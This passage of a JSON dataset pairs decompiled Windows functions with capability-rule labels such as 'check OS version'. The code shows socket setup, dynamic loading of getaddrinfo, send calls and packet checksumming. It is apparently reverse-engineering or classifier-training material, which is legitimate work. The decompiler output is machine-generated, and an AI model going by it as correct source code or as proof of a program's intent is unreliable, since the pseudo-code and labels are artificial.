*(iVar9 + 0xc);\n            iVar8 = iVar8 + 1;\n            iVar13 = iVar8 * 4;\n            iVar11 = piVar2[iVar8];\n        }\n        uVar12 = fcn.20023a81(&var_b0h, uVar12, &var_2ch);\n        if ((4 < uVar12) && (uVar12 < 0x25)) {\n            iVar8 = 0;\n            if (0 < uVar12) {\n                do {\n                    *(&var_2ch + iVar8) = *(&var_2ch + iVar8) ^ var_2ch._2_1_ >> 1;\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < uVar12);\n            }\n            if ((var_28h & 0x1f) < 0x1d) {\n                uVar7 = (_var_28h & 0x1f) + 5;\n                if (uVar7 <= uVar12) {\n                    if (uVar12 != uVar7) {\n                        uVar12 = uVar7;\n                    }\n                    uVar4 = 0;\n                    iVar8 = 0;\n                    var_2ch = var_2ch & 0xff00ffff;\n                    if (0 < uVar12) {\n                        do {\n                            uVar4 = uVar4 + *(&var_2ch + iVar8);\n                            iVar8 = iVar8 + 1;\n                        } while (iVar8 < uVar12);\n                    }\n                    if (var_2ch._2_1_ == uVar4) {\n                        iVar6 = (*_sym.imp.WS2_32.dll_ntohs)(var_2ch);\n                        if (iVar6 == var_4h) {\n                            if (var_8h == 0) {\n                                if ((_var_28h & 0x20) != 0) goto code_r0x2001a759;\n                            }\n                            else {\n                                if ((_var_28h & 0x20) == 0) {\n                                    arg_20h = 0x2159000e;\n                                    goto code_r0x2001a759;\n                                }\n                                if ((_var_28h & 0x1f) == 0) {\n                                    *arg_14h = 0;\n                                    *arg_18h = 0;\n                                }\n                                else {\n                                    iVar8 = (*_sym.imp.msvcrt.dll_malloc)(_var_28h & 0x1f);\n                                    *arg_14h = iVar8;\n                                    if (iVar8 == 0) {\n                                        arg_20h = 0x21590004;\n                                        goto code_r0x2001a759;\n                                    }\n                                    *arg_18h = _var_28h & 0x1f;\n                                    sub.ntdll.dll_memcpy(*arg_14h, &var_27h, _var_28h & 0x1f);\n                                }\n                            }\n                            arg_20h = 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x2001a759:\n    fcn.2000157d(0x20047028);\n    return arg_20h;\n}\n",
        "token_count": 2172
    },
    "2001ab1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001ab1b(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint32_t **arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar5 = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_24h = NULL;\n    var_14h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    *arg_14h = NULL;\n    if ((arg_8h == 0) && (arg_ch == 0)) {\n        return 0x2af9;\n    }\n    if (arg_10h != NULL) {\n        if ((((arg_10h[4] != 0) || (arg_10h[5] != 0)) || (arg_10h[6] != 0)) || (arg_10h[7] != 0)) {\n            return 0x2afb;\n        }\n        var_ch = *arg_10h;\n        if (((var_ch & 2) != 0) && (arg_8h == 0)) {\n            return 0x2726;\n        }\n        if ((arg_10h[1] != 0) && (arg_10h[1] != 2)) {\n            return 0x273f;\n        }\n        uVar5 = arg_10h[2];\n        if ((((uVar5 != 0) && (uVar5 != 1)) && (uVar5 != 2)) && (uVar5 != 3)) {\n            return 0x273c;\n        }\n        var_20h = arg_10h[3];\n    }\n    if (arg_ch != 0) {\n        var_4h = (*_sym.imp.ntdll.dll_strtoul)(arg_ch, &var_24h, 10);\n        pcVar1 = _sym.imp.WS2_32.dll_getservbyname;\n        var_4h = var_4h & 0xffff;\n        if (*var_24h == '\\0') {\n            var_18h = (*_sym.imp.WS2_32.dll_htons)(var_4h);\n            var_18h = var_18h & 0xffff;\n            var_4h = var_18h;\n            if (uVar5 == 0) {\n                uVar5 = 1;\n                var_14h = 1;\n            }\n        }\n        else {\n            if (((uVar5 == 0) || (uVar5 == 2)) &&\n               (iVar2 = (*_sym.imp.WS2_32.dll_getservbyname)(arg_ch, 0x2002d98c),  iVar2 != 0)) {\n                var_18h = *(iVar2 + 8);\n                var_4h = var_18h;\n            }\n            if (((uVar5 == 0) || (uVar5 == 1)) && (iVar2 = (*pcVar1)(arg_ch, 0x2002d9b8),  iVar2 != 0)) {\n                var_1ch = *(iVar2 + 8);\n                var_4h = var_1ch;\n            }\n            if (var_4h == 0) {\n                return (-(uVar5 != 0) & 0xfffffc84) + 0x2af9;\n            }\n            if (uVar5 == 0) {\n                uVar5 = (var_1ch == 0) + 1;\n                if (var_1ch != 0) {\n                    var_14h = 1;\n                    if (var_18h != 0) goto code_r0x2001acc9;\n                }\n                var_14h = 0;\n            }\n        }\n    }\ncode_r0x2001acc9:\n    if (arg_8h == 0) {\n        var_10h = (*_sym.imp.WS2_32.dll_htonl)((-((var_ch & 1) != 0) & 0x80ffffff) + 0x7f000001);\ncode_r0x2001ad27:\n        puVar3 = fcn.2001a897(uVar5, var_20h, var_4h, var_10h);\n        *arg_14h = puVar3;\n        if (puVar3 == NULL) {\n            var_8h = 8;\n            goto code_r0x2001ad90;\n        }\n        if ((arg_8h != 0) && (*puVar3 = *puVar3 | 4,  (var_ch & 2) != 0)) {\n            uVar4 = (*_sym.imp.WS2_32.dll_inet_ntoa)(var_10h);\n            uVar5 = fcn.2001a823(uVar4);\n            (*arg_14h)[5] = uVar5;\n            if ((*arg_14h)[5] == 0) {\n                var_8h = 8;\n                goto code_r0x2001ad75;\n            }\n        }\n    }\n    else {\n        iVar2 = fcn.2001a85a(arg_8h, &var_10h);\n        if (iVar2 != 0) goto code_r0x2001ad27;\n        if ((var_ch & 4) != 0) {\n            var_8h = 0x2af9;\n            goto code_r0x2001ad90;\n        }\n        var_8h = fcn.2001a9a6(arg_8h, uVar5, var_20h, var_4h, var_ch & 2, arg_14h);\ncode_r0x2001ad75:\n        if (var_8h != 0) goto code_r0x2001ad90;\n    }\n    if (var_14h == 0) {\n        return var_8h;\n    }\n    var_8h = fcn.2001aa9f();\n    if (var_8h == 0) {\n        return 0;\n    }\ncode_r0x2001ad90:\n    fcn.2001aadf(*arg_14h);\n    *arg_14h = NULL;\n    return var_8h;\n}\n",
        "token_count": 1530
    },
    "2001af3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001af3e(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint lpBuffer;\n    uint dest;\n    char *var_18h;\n    code *var_14h;\n    char *var_10h;\n    code *var_ch;\n    char *var_8h;\n    code *var_4h;\n    \n    var_18h = \"getaddrinfo\";\n    var_14h = fcn.2001ab1b;\n    var_10h = \"getnameinfo\";\n    var_ch = fcn.2001ada3;\n    var_8h = \"freeaddrinfo\";\n    var_4h = fcn.2001aadf;\n    if (*0x20047048 != 0) goto code_r0x2001b08c;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    if (iVar3 != 0) {\n        sub.ntdll.dll_strcpy(&dest, &lpBuffer);\n        sub.ntdll.dll_strcat(&dest, \"\\\\ws2_32\");\n        pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&dest);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar3 == 0) {\ncode_r0x2001aff6:\n            sub.ntdll.dll_strcpy(&dest, &lpBuffer);\n            sub.ntdll.dll_strcat(&dest, \"\\\\wship6\");\n            iVar3 = (*pcVar1)(&dest);\n            if (iVar3 != 0) {\n                iVar4 = (*pcVar2)(iVar3, \"getaddrinfo\");\n                if (iVar4 == 0) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                    iVar3 = 0;\n                }\n                if (iVar3 != 0) goto code_r0x2001b045;\n            }\n        }\n        else {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"getaddrinfo\");\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                iVar3 = 0;\n            }\n            if (iVar3 == 0) goto code_r0x2001aff6;\ncode_r0x2001b045:\n            iVar4 = 0;\n            do {\n                iVar5 = (*pcVar2)(iVar3, (&var_18h)[iVar4 * 2]);\n                (&var_14h)[iVar4 * 2] = iVar5;\n                if (iVar5 == 0) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                    iVar3 = 0;\n                    break;\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 3);\n            if (iVar3 != 0) {\n                iVar3 = 0;\n                do {\n                    *(iVar3 + 0x20046880) = *(&var_14h + iVar3);\n                    iVar3 = iVar3 + 8;\n                } while (iVar3 < 0x18);\n            }\n        }\n    }\n    *0x20047048 = 1;\ncode_r0x2001b08c:\n    return *((arg_8h & 0xffff) * 8 + 0x20046880);\n}\n",
        "token_count": 781
    },
    "2001b24e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001b24e(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint var_100h;\n    \n    if ((*(arg_8h + 0xc) != 0) && ((arg_ch == 4 || (arg_ch == 3)))) {\n        iVar2 = fcn.2001b09b(arg_8h + 0x10, 0x80, &var_100h, 0x100, 0, 0, 2);\n        if (iVar2 != 0) {\n            sub.ntdll.dll_strcpy(&var_100h, \"<unknown>\");\n        }\n        uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(*(arg_8h + 0x12));\n        iVar2 = sub.ntdll.dll_strlen(&var_100h, 0x2002fbe8, uVar1);\n        (*_sym.imp.ntdll.dll_sprintf)(&var_100h + iVar2);\n        if (arg_ch == 3) {\n            if (arg_14h == 4) {\n                iVar2 = sub.ntdll.dll_strlen(&var_100h);\n                *arg_10h = iVar2 + 1;\n                return 0;\n            }\n        }\n        else if (0 < arg_14h) {\n            iVar2 = sub.ntdll.dll_strlen(&var_100h);\n            if (iVar2 + 1U <= arg_14h) {\n                sub.ntdll.dll_strcpy(arg_10h, &var_100h);\n                return 0;\n            }\n            (*_sym.imp.ntdll.dll_strncpy)(arg_10h, &var_100h, arg_14h - 1);\n            *(arg_10h + (arg_14h - 1)) = 0;\n            return 0;\n        }\n        return 0x21590064;\n    }\n    return 0x21590001;\n}\n",
        "token_count": 455
    },
    "2001b35d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001b35d(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if ((*(arg_8h + 0x118) == 0) || ((arg_14h & 0x10000) != 0)) {\n        iVar1 = (*_sym.imp.WS2_32.dll_send)(*(arg_8h + 4), arg_ch, arg_10h, 0);\n        if (iVar1 == -1) {\n            iVar1 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            if (iVar1 == 0x2738) {\n                iVar1 = 0x2159000b;\n            }\n        }\n        else {\n            iVar1 = 0;\n        }\n    }\n    else {\n        sub.ntdll.dll_memset(&var_20h, 0, 0x20);\n        if (*(arg_8h + 0x118) != 0) {\n            fcn.2002395a(arg_8h + 0x11c, &var_20h);\n        }\n        var_20h = &var_10h;\n        var_ch = arg_ch;\n        var_8h = arg_10h;\n        iVar1 = fcn.20012045(arg_8h, &var_20h, arg_14h | 0x10000);\n        (*_sym.imp.msvcrt.dll_free)(var_1ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 382
    },
    "2001b574": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001b574(int32_t *arg_8h, uint noname_1, int32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int16_t *s1;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x98);\n    if (iVar1 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar1, 0, 0x98);\n    *(iVar1 + 4) = 0xffffffff;\n    var_4h = 0x21590064;\n    if (arg_10h != 0) {\n        s1 = iVar1 + 0x10;\n        var_4h = fcn.200234f8(arg_10h, arg_14h, arg_18h & 1, s1, iVar1 + 0x90);\n        if (var_4h == 0) {\n            iVar2 = (*_sym.imp.WS2_32.dll_socket)(*s1, 2, 0);\n            *(iVar1 + 4) = iVar2;\n            if (iVar2 != -1) {\n                *(iVar1 + 8) = *s1;\n                fcn.20021cb5(iVar2);\n                var_4h = (*_sym.imp.WS2_32.dll_bind)(*(iVar1 + 4), s1, *(iVar1 + 0x90));\n                if (var_4h != -1) {\n                    if (var_4h == 0) {\n                        *arg_8h = iVar1;\n                        return 0;\n                    }\n                    goto code_r0x2001b5f7;\n                }\n            }\n            var_4h = 0x21590009;\n        }\n    }\ncode_r0x2001b5f7:\n    iVar2 = *(iVar1 + 4);\n    if ((iVar2 != 0) && (iVar2 != -1)) {\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar2);\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar1);\n    return var_4h;\n}\n",
        "token_count": 511
    },
    "2001b647": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001b647(int32_t *arg_8h, uint noname_1, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x128);\n    if (iVar2 == 0) {\n        return 0x21590004;\n    }\n    sub.ntdll.dll_memset(iVar2, 0, 0x128);\n    *(iVar2 + 4) = 0xffffffff;\n    *(iVar2 + 0xc) = 1;\n    var_4h = 0x21590064;\n    if (arg_18h != 0) {\n        piVar1 = iVar2 + 0x10;\n        var_4h = fcn.200234f8(arg_18h, arg_1ch, arg_20h & 2, piVar1, iVar2 + 0x114);\n        if (var_4h != 0) goto code_r0x2001b6d6;\n        iVar3 = (*_sym.imp.WS2_32.dll_socket)(*piVar1, 2, 0);\n        *(iVar2 + 4) = iVar3;\n        if (iVar3 != -1) {\n            *(iVar2 + 8) = *piVar1;\n            goto code_r0x2001b700;\n        }\n        goto code_r0x2001b6cf;\n    }\ncode_r0x2001b700:\n    if (arg_10h != 0) {\n        piVar1 = iVar2 + 0x90;\n        var_4h = fcn.200234f8(arg_10h, arg_14h, arg_20h & 2, piVar1, iVar2 + 0x110);\n        if (var_4h == 0) {\n            if (*(iVar2 + 4) == -1) {\n                uVar4 = (*_sym.imp.WS2_32.dll_socket)(*piVar1, 2, 0);\n                *(iVar2 + 4) = uVar4;\n                *(iVar2 + 8) = *(iVar2 + 0x10);\n            }\n            if (*(iVar2 + 4) != -1) {\n                fcn.20021cb5(*(iVar2 + 4));\n                var_4h = (*_sym.imp.WS2_32.dll_bind)(*(iVar2 + 4), piVar1, *(iVar2 + 0x110));\n                if (var_4h != -1) goto code_r0x2001b77a;\n            }\ncode_r0x2001b6cf:\n            var_4h = 0x21590009;\n            goto code_r0x2001b6d6;\n        }\n    }\ncode_r0x2001b77a:\n    if ((arg_18h != 0) &&\n       (iVar3 = (*_sym.imp.WS2_32.dll_connect)(*(iVar2 + 4), iVar2 + 0x10, *(iVar2 + 0x114)),  iVar3 == -1)) {\n        var_4h = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n    }\n    if (var_4h == 0) {\n        *arg_8h = iVar2;\n        return 0;\n    }\ncode_r0x2001b6d6:\n    iVar3 = *(iVar2 + 4);\n    if ((iVar3 != 0) && (iVar3 != -1)) {\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar3);\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar2);\n    return var_4h;\n}\n",
        "token_count": 882
    },
    "2001b7b5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001b7b5(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    \n    if ((*(arg_8h + 0x118) == 0) || ((arg_10h & 0x10000) != 0)) {\n        uVar1 = fcn.2001b448(arg_8h);\n    }\n    else {\n        sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n        if (*(arg_8h + 0x118) != 0) {\n            fcn.2002395a(arg_8h + 0x11c, &var_10h);\n        }\n        var_10h = arg_ch;\n        uVar1 = fcn.2001b448(arg_8h);\n        (*_sym.imp.msvcrt.dll_free)(var_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "2001ba1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001ba1b(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            sub.ntdll.dll_memcpy(arg_8h + 0x14, arg_10h, 0x10);\n        }\n        else {\n            iVar2 = 0x21590064;\n        }\n    }\n    iVar1 = fcn.200136d0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 204
    },
    "2001bea5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001bea5(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    char *in_EAX;\n    int32_t unaff_ESI;\n    uint s1;\n    uchar uStack8;\n    \n    if (arg_8h != 0) {\n        if (*in_EAX != '\\x01') {\n            return 1;\n        }\n        if (arg_8h == 3) {\n            sub.ntdll.dll_memcpy(&s1);\n            uVar1 = (*_sym.imp.WS2_32.dll_ntohs)(CONCAT13(uStack8, s1._1_3_));\n            if (uVar1 != 0) {\n                *(unaff_ESI + 0x10) = uVar1;\n                *(unaff_ESI + 0xc) = uVar1;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 204
    },
    "2001c03b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001c03b(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    \n    if ((1 < arg_ch) && (ppiVar4 = arg_8h,  arg_8h != NULL)) {\n        do {\n            iVar1 = fcn.200018bf();\n            iVar2 = 0;\n            ppiVar3 = arg_8h;\n            do {\n                if (iVar2 == iVar1 % arg_ch) break;\n                ppiVar3 = *ppiVar3;\n                iVar2 = iVar2 + 1;\n            } while (ppiVar3 != NULL);\n            if (ppiVar3 == NULL) {\n                return;\n            }\n            if ((ppiVar3 != ppiVar4) && (ppiVar3[3] != ppiVar4[3])) {\n                fcn.2001bc6e();\n            }\n            ppiVar4 = *ppiVar4;\n        } while (ppiVar4 != NULL);\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "2001c085": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.2001c085(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint *puVar2;\n    \n    iVar1 = *in_EAX;\n    while (iVar1 != 0) {\n        for (puVar2 = *in_EAX; puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[3] < in_EAX[3]) {\n                fcn.2001bc6e();\n            }\n        }\n        in_EAX = *in_EAX;\n        iVar1 = *in_EAX;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "2001c0ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001c0ae(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    uint *var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    uint *s;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t ptr;\n    int32_t var_ch;\n    uint32_t hostshort;\n    int32_t **var_4h;\n    \n    arg_8h_00 = arg_8h;\n    var_4h = NULL;\n    if (*(arg_8h + 8) == 0) {\n        iVar1 = 0x21590003;\n    }\n    else {\n        if (*(arg_8h + 0x24) == 0) {\n            arg_ch = fcn.2001bcaa(arg_ch);\n            ptr = arg_ch;\n            if (arg_ch == 0) {\n                return 0x21590004;\n            }\n        }\n        else {\n            ptr = 0;\n        }\n        iVar1 = fcn.2001bf2b(arg_8h_00, arg_ch, arg_10h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_14h < 0x7fff) {\n                if (var_14h < 0x10) {\n                    var_ch = 1;\n                    iVar1 = fcn.200018bf();\n                    piVar4 = iVar1 % 7 + 1;\n                    for (ppiVar3 = var_4h; ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                        ppiVar3[3] = piVar4;\n                        uVar2 = fcn.200018bf();\n                        uVar2 = uVar2 & 0x80000007;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                        }\n                        piVar4 = piVar4 + uVar2 + 1;\n                    }\n                }\n                else if (var_14h < 0x7f) {\n                    piVar4 = 0x1;\n                    var_ch = 1;\n                    for (ppiVar3 = var_4h; ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                        ppiVar3[3] = piVar4;\n                        piVar4 = piVar4 + 1;\n                    }\n                }\n                else {\n                    var_ch = 0;\n                    if (var_14h < 0x100) {\n                        uVar2 = fcn.200018bf();\n                        uVar2 = uVar2 & 0x8000007f;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                        }\n                        piVar4 = uVar2 + 1;\n                        for (ppiVar3 = var_4h; ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                            ppiVar3[3] = piVar4;\n                            uVar2 = fcn.200018bf();\n                            uVar2 = uVar2 & 0x8000007f;\n                            if (uVar2 < 0) {\n                                uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                            }\n                            piVar4 = piVar4 + uVar2 + 1;\n                        }\n                    }\n                    else {\n                        piVar4 = 0x1;\n                        for (ppiVar3 = var_4h; ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                            ppiVar3[3] = piVar4;\n                            piVar4 = piVar4 + 1;\n                        }\n                    }\n                }\n                fcn.2001c03b(var_4h, var_14h);\n                iVar1 = 0;\n                sub.ntdll.dll_memset(&s, 0, 0x10);\n                sub.ntdll.dll_memset(&var_44h, 0, 0x10);\n                sub.ntdll.dll_memset(&var_34h, 0, 0x10);\n                var_14h = arg_8h_00 + 0x2c;\n                fcn.20001567(var_14h);\n                ppiVar3 = var_4h;\n                do {\n                    while( true ) {\n                        if (ppiVar3 == NULL) goto code_r0x2001c2ef;\n                        if (var_ch == 0) {\n                            arg_8h = CONCAT13(0xff, arg_8h);\n                            hostshort = *(ppiVar3 + 3);\n                            if (*ppiVar3 == NULL) {\n                                hostshort = hostshort | 0x8000;\n                            }\n                            var_20h = &arg_8h + 3;\n                            s = &var_44h;\n                            var_1ch = 1;\n                            hostshort = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n                            hostshort = hostshort & 0xffff;\n                            var_40h = &hostshort;\n                            var_44h = &var_34h;\n                            var_3ch = 2;\n                        }\n                        else {\n                            arg_8h = arg_8h & 0xffffff | *(ppiVar3 + 3) << 0x18;\n                            if (*ppiVar3 == NULL) {\n                                arg_8h = arg_8h | 0x80000000;\n                            }\n                            var_20h = &arg_8h + 3;\n                            s = &var_34h;\n                            var_1ch = 1;\n                        }\n                        var_30h = ppiVar3[1];\n                        var_2ch = ppiVar3[2];\n                        if (*(arg_8h_00 + 0xc) < ppiVar3[2]) {\n                            iVar1 = 0x2159000b;\n                        }\n                        else {\n                            iVar1 = fcn.20013845(*(arg_8h_00 + 4), &s, arg_14h);\n                            if ((iVar1 != 0) && (iVar1 != 0x2159000b)) goto code_r0x2001c2e6;\n                        }\n                        if (iVar1 == 0x2159000b) break;\n                        if (*(arg_8h_00 + 0x10) < ppiVar3[2]) {\n                            *(arg_8h_00 + 0x10) = ppiVar3[2];\n                        }\n                        ppiVar3 = *ppiVar3;\n                    }\n                    if (*(arg_8h_00 + 0xc) == *(arg_8h_00 + 0x10)) {\n                        *(arg_8h_00 + 0x10) = 0;\n                    }\n                    else if (ppiVar3[2] < *(arg_8h_00 + 0xc)) {\n                        *(arg_8h_00 + 0xc) = ppiVar3[2];\n                    }\n                    iVar1 = fcn.2001bb93();\n                } while (iVar1 == 0);\ncode_r0x2001c2e6:\n                if (ppiVar3 != var_4h) {\n                    *(arg_8h_00 + 8) = 0;\n                }\ncode_r0x2001c2ef:\n                fcn.2000157d(var_14h);\n                fcn.2001bc57();\n                (*_sym.imp.msvcrt.dll_free)(ptr);\n            }\n            else {\n                fcn.2001bc57();\n                iVar1 = 0x2159000b;\n            }\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 1829
    },
    "2001c35c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
